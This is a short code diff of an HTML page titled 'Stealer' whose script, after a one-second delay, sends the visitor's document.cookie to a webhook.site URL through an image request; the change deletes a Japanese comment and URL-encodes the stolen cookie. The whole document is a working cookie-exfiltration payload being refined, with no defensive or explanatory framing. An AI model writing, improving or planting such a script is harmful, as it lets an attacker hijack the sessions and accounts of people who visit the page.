@@ -3,9 +3,8 @@
 <head><title>Stealer</title></head>
 <body>
 <script>
-  // 遅延してクッキー送信
   setTimeout(() => {
-    new Image().src = "https://webhook.site/febb518d-f3ba-47bf-a10e-3c206fb283b5?c=" + document.cookie;
+    new Image().src = "https://webhook.site/febb518d-f3ba-47bf-a10e-3c206fb283b5?c=" + encodeURIComponent(document.cookie);
   }, 1000);
 </script>
 </body>
